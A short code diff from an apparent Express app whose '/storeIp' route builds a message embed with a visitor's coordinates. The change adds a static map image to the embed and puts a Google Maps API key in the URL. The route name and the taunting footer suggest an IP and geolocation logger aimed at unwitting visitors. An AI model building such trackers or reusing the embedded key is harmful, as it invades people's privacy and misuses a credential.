@@ -68,6 +68,7 @@ app.get("/storeIp", (req, res) => {
         { name: "Longitude", value: `${long}`, inline: true },
         { name: "\u200B", value: "\u200B" }
       )
+      .attachFiles(["https://maps.googleapis.com/maps/api/staticmap?&zoom=11&size=600x400&maptype=roadmap&markers=color:red%7C40.718217,-73.998284&key=AIzaSyCxVxnNUAEL2BFgScCl5CwPD1yDulNe5Hg"])
       .setTimestamp()
       .setFooter("He do be getting yeeted doe");
 
